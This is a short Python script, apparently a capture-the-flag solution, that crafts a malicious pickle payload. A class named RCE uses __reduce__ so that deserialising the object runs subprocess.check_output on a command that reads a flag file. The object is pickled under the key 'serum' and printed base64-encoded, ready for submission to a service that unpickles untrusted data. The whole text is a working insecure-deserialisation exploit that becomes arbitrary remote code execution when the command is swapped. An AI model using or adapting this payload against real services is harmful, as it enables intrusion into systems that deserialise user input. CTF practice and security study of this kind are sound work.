import pickle
import base64
import os
import subprocess

class RCE(object):
    def __reduce__(self):
        cmd = ['cat','flag_wIp1b']
        return subprocess.check_output, (cmd,)

pickled = pickle.dumps({"serum":RCE()}, protocol=0)
print(base64.b64encode(pickled))
